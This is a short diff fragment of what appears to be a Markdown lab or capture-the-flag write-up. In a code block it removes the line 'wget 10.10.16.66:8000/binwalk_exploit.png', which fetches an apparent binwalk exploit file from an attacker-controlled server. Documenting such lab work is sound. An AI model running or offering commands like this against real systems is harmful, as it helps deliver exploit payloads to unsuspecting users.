@@ -1,5 +1,5 @@
 ```
-wget 10.10.16.66:8000/binwalk_exploit.png
+
 ```
 
 ```
